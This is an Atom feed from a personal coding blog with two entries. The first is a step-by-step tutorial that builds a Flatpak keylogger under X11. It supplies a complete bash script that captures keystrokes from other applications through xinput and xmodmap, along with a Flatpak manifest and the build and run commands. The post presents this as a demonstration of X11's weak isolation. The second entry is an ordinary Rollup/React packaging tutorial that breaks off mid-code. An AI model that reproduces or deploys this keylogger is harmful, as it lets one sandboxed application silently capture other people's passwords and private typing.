<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Gloria&#39;s Notebook</title>
  
  
  <link href="https://beking0912.github.io/atom.xml" rel="self"/>
  
  <link href="https://beking0912.github.io/"/>
  <updated>2023-04-13T01:49:29.298Z</updated>
  <id>https://beking0912.github.io/</id>
  
  <author>
    <name>Gloria Su</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>üíª Flatpak Development: X11 Keylogger</title>
    <link href="https://beking0912.github.io/2023/04/04/Flatpak-Development-A-11-Keylogger/"/>
    <id>https://beking0912.github.io/2023/04/04/Flatpak-Development-A-11-Keylogger/</id>
    <published>2023-04-04T21:06:13.000Z</published>
    <updated>2023-04-13T01:49:29.298Z</updated>
    
    <content type="html"><![CDATA[<p>X11 has been a widely used windowing system on Unix platforms for decades, but its security vulnerabilities have become increasingly apparent. As the transition to the more secure Wayland windowing system is slow, X11 remains in use in many Linux distributions as the default window system. One of the insecure aspects of X11 is the ability to perform keylogging with a simple one-line shell command using the xinput command.<br>In this blog post, we will explore how to create a Flatpak, a sandboxed application package, that can eavesdrop on keyboard entries of other applications outside of its sandbox in an X11 window session.</p><h2 id="Environment"><a href="#Environment" class="headerlink" title="Environment"></a>Environment</h2><ul><li><strong>Environment</strong>: VMware Fusion, Fedora 37, X11</li><li><a href="https://en.wikipedia.org/wiki/X_Window_System"><strong>X11</strong></a>: X11 is a windowing system used on Unix-like operating systems for bitmap displays.</li><li><a href="https://en.wikipedia.org/wiki/Flatpak"><strong>Flatpak</strong></a>: Flatpak is a Linux utility for software deployment and package management that provides a sandbox environment to run applications in isolation from the system.</li><li>You should be logged into the X11 windowing environment for the keylogger to work, confirm by executing <code>echo $XDG_SESSION_TYPE</code>.</li></ul><h2 id="Build-a-Flatpak"><a href="#Build-a-Flatpak" class="headerlink" title="Build a Flatpak"></a>Build a Flatpak</h2><h3 id="1-Install-a-runtime-and-the-matching-SDK"><a href="#1-Install-a-runtime-and-the-matching-SDK" class="headerlink" title="1. Install a runtime and the matching SDK"></a>1. Install a runtime and the matching SDK</h3><p>Install the freedesktop Platform and SDK runtimes from Flathub, which are used to build and run Flatpak applications.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flatpak install flathub org.freedesktop.Platform//22.08 org.freedesktop.Sdk//22.08</span><br></pre></td></tr></table></figure><h3 id="2-Create-a-script-named-as-keylogger-sh"><a href="#2-Create-a-script-named-as-keylogger-sh" class="headerlink" title="2. Create a script named as keylogger.sh"></a>2. Create a script named as keylogger.sh</h3><p>The script sets up a keylogger by capturing key input events, modifying them to replace key codes with their corresponding key values, and storing the modified events in a file.<br>Let‚Äôs go through the main parts of the code:</p><p><strong><code>trap_commands()</code></strong>: This is a function that defines the actions to be taken when the script receives a <code>SIGINT</code> signal, which is generated when the script is interrupted with <code>^C</code>. This function reads key mapping data from <code>/tmp/keylogger_keyboard.txt</code> and key input events from <code>/tmp/keylogger_output.txt</code>. It then uses this data to replace key codes with their corresponding key values in the input events, and writes the modified events to <code>/tmp/keylogger_final_output.txt</code>. Finally, the function prints ‚ÄúFinished‚Äù and exits with a status code of 0.</p><p><strong><code>trap &#39;trap_commands&#39; SIGINT</code></strong>: This registers the <code>trap_commands</code> function to be executed when the script receives a <code>SIGINT</code> signal.</p><p><strong><code>xmodmap -pke &gt; /tmp/keylogger_keyboard.txt</code></strong>: This command generates a list of key mappings using xmodmap and writes the output to <code>/tmp/keylogger_keyboard.txt</code>. This file contains the mapping between key codes and their corresponding key values.</p><p><strong><code>xinput test $(xinput list | grep &#39;Keyboard Name&#39; | sed &#39;s/.*id=\([0-9]*\).*/\1/&#39;) &gt; /tmp/keylogger_output.txt</code></strong>: This command captures key input events using xinput and writes the output to <code>/tmp/keylogger_output.txt</code>. This file contains the raw key input events that will be processed by the script.<br>Find the name of your keyboard by the list of <code>libinput list-devices</code>, then replace ‚ÄòKeyboard Name‚Äô with your keyboard name.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Hide terminal output for ^C</span></span><br><span class="line"><span class="built_in">stty</span> -echoctl</span><br><span class="line"></span><br><span class="line"><span class="comment"># Define trap function to execute on SIGINT</span></span><br><span class="line"><span class="function"><span class="title">trap_commands</span></span> () &#123;</span><br><span class="line">    <span class="built_in">declare</span> -A animals</span><br><span class="line">    animals=([<span class="string">&quot;None&quot;</span>]=<span class="string">&quot;None&quot;</span>)</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$&#123;animals[None]&#125;</span>&quot;</span></span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">read</span> p; <span class="keyword">do</span></span><br><span class="line">        key_id=$(<span class="built_in">echo</span> <span class="variable">$p</span> | <span class="built_in">tr</span> -s <span class="string">&#x27; &#x27;</span> | <span class="built_in">cut</span> -d<span class="string">&#x27; &#x27;</span> -f2)</span><br><span class="line">        key_value=$(<span class="built_in">echo</span> <span class="variable">$p</span> | <span class="built_in">tr</span> -s <span class="string">&#x27; &#x27;</span> | <span class="built_in">cut</span> -d<span class="string">&#x27; &#x27;</span> -f4)</span><br><span class="line">        animals[<span class="string">&quot;<span class="variable">$key_id</span>&quot;</span>]=<span class="string">&quot;<span class="variable">$key_value</span>&quot;</span></span><br><span class="line">    <span class="keyword">done</span> &lt;/tmp/keylogger_keyboard.txt</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;new record start...&quot;</span> &gt; /tmp/keylogger_final_output.txt</span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">read</span> q; <span class="keyword">do</span></span><br><span class="line">        key_id=$(<span class="built_in">echo</span> <span class="variable">$q</span> | <span class="built_in">tr</span> -s <span class="string">&#x27; &#x27;</span> | <span class="built_in">cut</span> -d<span class="string">&#x27; &#x27;</span> -f3)</span><br><span class="line">        <span class="keyword">if</span> [[ -v <span class="string">&quot;animals[<span class="variable">$key_id</span>]&quot;</span> ]]; <span class="keyword">then</span></span><br><span class="line">            new_value=<span class="string">&quot;<span class="variable">$&#123;animals[$key_id]&#125;</span>&quot;</span></span><br><span class="line">            (<span class="built_in">echo</span> <span class="variable">$q</span> | sed <span class="string">&quot;s/<span class="variable">$key_id</span>/<span class="variable">$new_value</span>/&quot;</span>) &gt;&gt; /tmp/keylogger_final_output.txt</span><br><span class="line">        <span class="keyword">fi</span></span><br><span class="line">    <span class="keyword">done</span> &lt;/tmp/keylogger_output.txt</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span> <span class="string">&quot;\rFinished. &quot;</span></span><br><span class="line">    <span class="built_in">exit</span> 0</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Register trap function with SIGINT signal</span></span><br><span class="line"><span class="built_in">trap</span> <span class="string">&#x27;trap_commands&#x27;</span> SIGINT</span><br><span class="line"></span><br><span class="line"><span class="comment"># Record key presses with xinput and xmodmap</span></span><br><span class="line">xmodmap -pke &gt; /tmp/keylogger_keyboard.txt</span><br><span class="line">xinput <span class="built_in">test</span> $(xinput list | grep <span class="string">&#x27;Keyboard Name&#x27;</span> | sed <span class="string">&#x27;s/.*id=\([0-9]*\).*/\1/&#x27;</span>) &gt; /tmp/keylogger_output.txt</span><br></pre></td></tr></table></figure><h3 id="3-Add-a-manifest-named-org-flatpak-keylogger-yml"><a href="#3-Add-a-manifest-named-org-flatpak-keylogger-yml" class="headerlink" title="3. Add a manifest named org.flatpak.keylogger.yml"></a>3. Add a manifest named org.flatpak.keylogger.yml</h3><p>The building process includes three modules: ‚Äúkeylogger‚Äù, ‚Äúxinput‚Äù, and ‚Äúxmodmap‚Äù. </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">app-id: org.flatpak.keylogger</span><br><span class="line">runtime: org.freedesktop.Platform</span><br><span class="line">runtime-version: <span class="string">&#x27;22.08&#x27;</span></span><br><span class="line">sdk: org.freedesktop.Sdk</span><br><span class="line"><span class="built_in">command</span>: keylogger.sh</span><br><span class="line">modules:</span><br><span class="line">  - name: keylogger</span><br><span class="line">    buildsystem: simple</span><br><span class="line">    build-commands:</span><br><span class="line">      - install -D keylogger.sh /app/bin/keylogger.sh</span><br><span class="line">    sources:</span><br><span class="line">      - <span class="built_in">type</span>: file</span><br><span class="line">        path: keylogger.sh</span><br><span class="line">  - name: xinput</span><br><span class="line">    buildsystem: autotools</span><br><span class="line">    build-commands:</span><br><span class="line">      - make</span><br><span class="line">      - make install</span><br><span class="line">    sources:</span><br><span class="line">      - <span class="built_in">type</span>: git</span><br><span class="line">        url: https://github.com/freedesktop/xorg-xinput.git</span><br><span class="line">  - name: xmodmap</span><br><span class="line">    buildsystem: autotools</span><br><span class="line">    build-commands:</span><br><span class="line">      - make</span><br><span class="line">      - make install</span><br><span class="line">    sources:</span><br><span class="line">      - <span class="built_in">type</span>: git</span><br><span class="line">        url: https://github.com/freedesktop/xmodmap.git</span><br></pre></td></tr></table></figure><h3 id="4-Build-the-application"><a href="#4-Build-the-application" class="headerlink" title="4. Build the application"></a>4. Build the application</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flatpak-builder build-dir org.flatpak.keylogger.yml</span><br></pre></td></tr></table></figure><p>Your file structure of <code>org.flatpak.keylogger</code> should look like this:<br><img src="https://s2.loli.net/2023/04/13/xGOQMofyZPzKgI4.png" alt="file.png"></p><h3 id="5-Test-the-build"><a href="#5-Test-the-build" class="headerlink" title="5. Test the build"></a>5. Test the build</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">flatpak-builder --user --install --force-clean build-dir org.flatpak.keylogger.yml</span><br><span class="line">flatpak run --socket=x11 --filesystem=/tmp org.flatpak.keylogger</span><br></pre></td></tr></table></figure><h2 id="Screenshot"><a href="#Screenshot" class="headerlink" title="Screenshot"></a>Screenshot</h2><h3 id="What-I-type-in-terminal"><a href="#What-I-type-in-terminal" class="headerlink" title="What I type in terminal"></a>What I type in terminal</h3><p><img src="https://s2.loli.net/2023/04/13/orqhtu168pRXyHP.png" alt="type-in.png"></p><h3 id="The-mapping-of-keyboard-keylogger-keyboard-txt"><a href="#The-mapping-of-keyboard-keylogger-keyboard-txt" class="headerlink" title="The mapping of keyboard: keylogger_keyboard.txt"></a>The mapping of keyboard: keylogger_keyboard.txt</h3><p><img src="https://s2.loli.net/2023/04/13/SimbBKaNyC6efxk.png" alt="keylogger_keyboard.png"></p><h3 id="The-original-keyboard-input-keylogger-output-txt"><a href="#The-original-keyboard-input-keylogger-output-txt" class="headerlink" title="The original keyboard input: keylogger_output.txt"></a>The original keyboard input: keylogger_output.txt</h3><p><img src="https://s2.loli.net/2023/04/13/fOFU8LcgtdQuMS9.png" alt="keylogger_output.png"></p><h3 id="The-keyboard-input-after-mapping-keylogger-final-output-txt"><a href="#The-keyboard-input-after-mapping-keylogger-final-output-txt" class="headerlink" title="The keyboard input after mapping: keylogger_final_output.txt"></a>The keyboard input after mapping: keylogger_final_output.txt</h3><p><img src="https://s2.loli.net/2023/04/13/RZfgD6ri2jzvsFk.png" alt="keylogger_final_output.png"></p><hr><p>References:</p><ul><li><a href="https://docs.flatpak.org/en/latest/first-build.html">https://docs.flatpak.org/en/latest/first-build.html</a></li><li><a href="http://techtrickery.com/keyloggers.html">http://techtrickery.com/keyloggers.html</a></li></ul><p>üìÆ If find any errors, please feel free to discuss and correct them: <a href="mailto:&#x62;&#x73;&#117;&#x35;&#x40;&#110;&#99;&#115;&#117;&#x2e;&#101;&#x64;&#x75;">&#x62;&#x73;&#117;&#x35;&#x40;&#110;&#99;&#115;&#117;&#x2e;&#101;&#x64;&#x75;</a>.</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;X11 has been a widely used windowing system on Unix platforms for decades, but its security vulnerabilities have become increasingly appa</summary>
      
    
    
    
    <category term="Coding" scheme="https://beking0912.github.io/categories/Coding/"/>
    
    
    <category term="Linux" scheme="https://beking0912.github.io/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>üì¶ Publish React npm Package with Rollup</title>
    <link href="https://beking0912.github.io/2023/02/06/Quickstart-with-Rollup/"/>
    <id>https://beking0912.github.io/2023/02/06/Quickstart-with-Rollup/</id>
    <published>2023-02-06T17:11:37.000Z</published>
    <updated>2023-02-19T19:16:13.952Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://s2.loli.net/2023/02/18/ojxUeXibkZClKzt.png" alt="rollup-typescript _2_.png"></p><p>In this tutorial, I‚Äôll walk you through my own process of using Rollup, a popular bundler, to create a React component package, enabling others to easily integrate your components into their projects. </p><h2 id="Initialize-the-repo"><a href="#Initialize-the-repo" class="headerlink" title="Initialize the repo"></a>Initialize the repo</h2><p>Create a new directory called <em><strong>react-lib</strong></em> and initialize a new npm project within it, allowing you to install and manage dependencies for a React library.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> react-lib</span><br><span class="line"><span class="built_in">cd</span> react-lib</span><br><span class="line">npm init</span><br></pre></td></tr></table></figure><h2 id="Add-dependencies"><a href="#Add-dependencies" class="headerlink" title="Add dependencies"></a>Add dependencies</h2><p>Add dependencies we need. And <strong><a href="https://styled-components.com/docs/">Styled-components</a></strong> is a CSS-in-JS library that allows to write CSS in JavaScript code. It provides a powerful API for building reusable and dynamic styled components in React applications. </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">npm i -D react typescript @types/react</span><br><span class="line">npm i --save styled-components</span><br></pre></td></tr></table></figure><h2 id="TypeScript-configuration"><a href="#TypeScript-configuration" class="headerlink" title="TypeScript configuration"></a>TypeScript configuration</h2><p>Initialize a TypeScript project by creating a <em><strong>tsconfig.json</strong></em> file which specifies how TypeScript should compile the project‚Äôs source files.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npx tsc --init</span><br></pre></td></tr></table></figure><p>This is an example for <em><strong>tsconfig.json</strong></em>.</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;compilerOptions&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;target&quot;</span><span class="punctuation">:</span> <span class="string">&quot;es5&quot;</span><span class="punctuation">,</span>                                <span class="comment">/* Specify ECMAScript target version: &#x27;ES3&#x27; (default), &#x27;ES5&#x27;, &#x27;ES2015&#x27;, &#x27;ES2016&#x27;, &#x27;ES2017&#x27;, &#x27;ES2018&#x27;, &#x27;ES2019&#x27;, &#x27;ES2020&#x27;, or &#x27;ESNEXT&#x27;. */</span></span><br><span class="line">    <span class="attr">&quot;module&quot;</span><span class="punctuation">:</span> <span class="string">&quot;esnext&quot;</span><span class="punctuation">,</span> </span><br><span class="line">    <span class="attr">&quot;jsx&quot;</span><span class="punctuation">:</span> <span class="string">&quot;react&quot;</span><span class="punctuation">,</span>                                <span class="comment">/* Specify what JSX code is generated. */</span></span><br><span class="line">    <span class="attr">&quot;moduleResolution&quot;</span><span class="punctuation">:</span> <span class="string">&quot;node&quot;</span><span class="punctuation">,</span>                       <span class="comment">/* Specify how TypeScript looks up a file from a given module specifier. */</span></span><br><span class="line">    <span class="attr">&quot;allowJs&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span>                                  <span class="comment">/* Allow JavaScript files to be a part of your program. Use the &#x27;checkJS&#x27; option to get errors from these files. */</span></span><br><span class="line">    <span class="attr">&quot;outDir&quot;</span><span class="punctuation">:</span> <span class="string">&quot;./types&quot;</span><span class="punctuation">,</span>                                     <span class="comment">/* Specify an output folder for all emitted files. */</span></span><br><span class="line">    <span class="attr">&quot;allowSyntheticDefaultImports&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span>             <span class="comment">/* Allow &#x27;import x from y&#x27; when a module doesn&#x27;t have a default export. */</span></span><br><span class="line">    <span class="attr">&quot;esModuleInterop&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span>                             <span class="comment">/* Emit additional JavaScript to ease support for importing CommonJS modules. This enables &#x27;allowSyntheticDefaultImports&#x27; for type compatibility. */</span></span><br><span class="line">    <span class="attr">&quot;forceConsistentCasingInFileNames&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span>            <span class="comment">/* Ensure that casing is correct in imports. */</span></span><br><span class="line">    <span class="attr">&quot;strict&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span>                                      <span class="comment">/* Enable all strict type-checking options. */</span></span><br><span class="line">    <span class="attr">&quot;skipLibCheck&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span>                                 <span class="comment">/* Skip type checking all .d.ts files. */</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;include&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">    <span class="string">&quot;src&quot;</span></span><br><span class="line">  <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;exclude&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">    <span class="string">&quot;test&quot;</span></span><br><span class="line">  <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><h2 id="ESLint-configuration"><a href="#ESLint-configuration" class="headerlink" title="ESLint configuration"></a>ESLint configuration</h2><p><strong>ESLint</strong> is a popular linting tool for JavaScript that helps catch common errors and enforce coding standards, and it can also be configured to catch specific coding issues, such as incorrect syntax or anti-patterns, saving time and prevent bugs from slipping through the cracks.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">npm i eslint -D </span><br><span class="line">npx eslint --init</span><br></pre></td></tr></table></figure><p>Create <em><strong>.eslintignore</strong></em> to exclude certain files from ESLint checks.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">test/**</span><br><span class="line">lib/**</span><br><span class="line">types/**</span><br></pre></td></tr></table></figure><h2 id="Add-gitignore"><a href="#Add-gitignore" class="headerlink" title="Add .gitignore"></a>Add .gitignore</h2><p>Create <em><strong>.gitignore</strong></em> to exclude certain files from git push.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/node_modules</span><br><span class="line">/types</span><br><span class="line">/lib</span><br></pre></td></tr></table></figure><h2 id="Adding-components"><a href="#Adding-components" class="headerlink" title="Adding components"></a>Adding components</h2><p>Write and export your custom component code in the src folder. And here is an example in TypeScript.</p><ul><li><p>src&#x2F;components&#x2F;Sum&#x2F;index.tsx</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="title class_">React</span> <span class="keyword">from</span> <span class="string">&quot;react&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">SumProps</span> &#125; <span class="keyword">from</span> <span class="string">&quot;./Sum.types&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="title class_">StyledSum</span> <span class="keyword">from</span> <span class="string">&quot;./styles&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title class_">Sum</span>: <span class="title class_">React</span>.<span class="property">FC</span>&lt;<span class="title class_">SumProps</span>&gt; = <span class="function">(<span class="params">&#123; a, b &#125;</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> sum = a + b;</span><br><span class="line">  <span class="keyword">return</span> <span class="language-xml"><span class="tag">&lt;<span class="name">StyledSum</span>&gt;</span>&#123;a&#125; + &#123;b&#125; = &#123;sum&#125;<span class="tag">&lt;/<span class="name">StyledSum</span>&gt;</span></span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="title class_">Sum</span>;</span><br></pre></td></tr></table></figure></li><li><p>src&#x2F;components&#x2F;Sum&#x2F;Sum.types.ts</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> type <span class="title class_">SumProps</span> = &#123;</span><br><span class="line">  <span class="attr">a</span>: number;</span><br><span class="line">  <span class="attr">b</span>: number;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li><li><p>src&#x2F;components&#x2F;Sum&#x2F;styles.tsx</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> styled <span class="keyword">from</span> <span class="string">&#x27;styled-components&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title class_">StyledSum</span> = styled.<span class="property">div</span><span class="string">`</span></span><br><span class="line"><span class="string">    display: flex;</span></span><br><span class="line"><span class="string">    align-items: center;</span></span><br><span class="line"><span class="string">    justify-content: center;</span></span><br><span class="line"><span class="string">    font-size: 1.2rem;</span></span><br><span class="line"><span class="string">    font-weight: bold;</span></span><br><span class="line"><span class="string">    padding: 10px;</span></span><br><span class="line"><span class="string">    background-color: #f2f2f2;</span></span><br><span class="line"><span class="string">    border: 1px solid #ccc;</span></span><br><span class="line"><span class="string">    border-radius: 5px;</span></span><br><span class="line"><span class="string">`</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="title class_">StyledSum</span>;</span><br></pre></td></tr></table></figure></li><li><p>src&#x2F;components&#x2F;index.ts</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> &#123; <span class="keyword">default</span> <span class="keyword">as</span> <span class="title class_">Sum</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;./Sum&#x27;</span>;</span><br></pre></td></tr></table></figure></li><li><p>src&#x2F;index.ts</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> * <span class="keyword">from</span> <span class="string">&#x27;./components&#x27;</span>;</span><br></pre></td></tr></table></figure></li></ul><h2 id="Rollup-configuration"><a href="#Rollup-configuration" class="headerlink" title="Rollup configuration"></a>Rollup configuration</h2><p><strong><a href="https://rollupjs.org/">Rollup</a></strong> is a module bundler that allows to package your code into modules, making it easier to share and distribute code. It creates a single file from multiple ES6 modules, resulting in smaller output files with faster loading times, and makes it particularly useful for creating libraries and packages, and can improve web application load times, especially on mobile devices.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm i -D rollup</span><br></pre></td></tr></table></figure><h3 id="Why-Rollup"><a href="#Why-Rollup" class="headerlink" title="Why Rollup"></a>Why Rollup</h3><ul><li>Rollup uses the ES6 standard format to bundle code.</li><li>It only bundles JavaScript, which makes it fast and generates small bundle sizes.</li><li>It has algorithmic advantages in handling pure code and is suitable for developing JavaScript libraries, it can also be used for bundling application development.</li></ul><h3 id="Why-not"><a href="#Why-not" class="headerlink" title="Why not"></a>Why not</h3><ul><li>When code splitting is needed, and Rollup does not support code splitting.</li><li>If there are many static resources that need to be processed, and the module structure is complex.</li><li>If the project being built requires many dependencies on CommonJS modules.</li></ul><h3 id="Packages"><a href="#Packages" class="headerlink" title="Packages"></a>Packages</h3><ul><li><strong>@rollup&#x2F;plugin-node-resolve</strong>: enables to use external libraries and modules. Rollup does not support directly bundling the contents of the node_modules folder, so it needs to be installed.</li><li><strong>@rollup&#x2F;plugin-commonjs</strong>: converts CommonJS modules to ES6 modules, enables to use modules that were not designed for ES6 module syntax. Lodash is not bundled by default as it uses CommonJS and Rollup only processes ES modules, but this package can solve the problem of CommonJS exports and ES module imports.</li><li><strong>@rollup&#x2F;plugin-typescript</strong>: compiles TypeScript files into JavaScript code.</li></ul><p>And this is my <em><strong>rollup.config.js</strong></em>.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> resolve <span class="keyword">from</span> <span class="string">&quot;@rollup/plugin-node-resolve&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> commonjs <span class="keyword">from</span> <span class="string">&quot;@rollup/plugin-commonjs&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> typescript <span class="keyword">from</span> <span class="string">&quot;@rollup/plugin-typescript&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">  <span class="attr">input</span>: <span class="string">&quot;src/index.ts&quot;</span>,</span><br><span class="line">  <span class="attr">external</span>: [<span class="string">&#x27;react&#x27;</span>],</span><br><span class="line">  <span class="attr">plugins</span>: [</span><br><span class="line">    <span class="title function_">typescript</span>(),</span><br><span class="line">    <span class="title function_">commonjs</span>(),</span><br><span class="line">    <span class="title function_">resolve</span>()</span><br><span class="line">  ],</span><br><span class="line">  <span class="attr">output</span>: [</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">file</span>: <span class="string">&quot;lib/bundle.cjs.js&quot;</span>,</span><br><span class="line">      <span class="attr">format</span>: <span class="string">&#x27;cjs&#x27;</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">file</span>: <span class="string">&quot;lib/bundle.esm.js&quot;</span>,</span><br><span class="line">      <span class="attr">format</span>: <span class="string">&#x27;esm&#x27;</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">file</span>: <span class="string">&quot;lib/bundle.browser.js&quot;</span>,</span><br><span class="line">      <span class="attr">format</span>: <span class="string">&#x27;umd&#x27;</span>,</span><br><span class="line">      <span class="attr">name</span>: <span 